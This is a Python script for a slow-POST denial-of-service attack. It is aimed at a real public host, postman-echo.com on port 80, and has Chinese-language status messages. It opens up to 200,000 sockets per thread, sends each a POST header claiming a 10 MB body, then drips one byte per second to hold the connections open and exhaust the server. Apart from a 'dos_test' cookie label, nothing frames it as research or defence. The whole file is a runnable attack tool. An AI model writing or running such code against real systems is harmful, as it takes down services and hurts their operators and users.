import socket
import time
import threading
 
MAX_CONN = 200000  
PORT = 80
HOST = "postman-echo.com" 
PAGE = "/get"  
 
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n" 
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
 
socks = []
 
def conn_thread():
    global socks
    for i in range(0, MAX_CONN):  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            print("[+] 成功發送魁儡buffer!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] 無法連接服務器或發送錯誤:%s" % ex)
 
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("[-] 發送異常:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)
 
 
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())

conn_th.start()
send_th.start()
 
conn_th2 = threading.Thread(target=conn_thread, args=())
send_th2 = threading.Thread(target=send_thread, args=())
conn_th2.start()
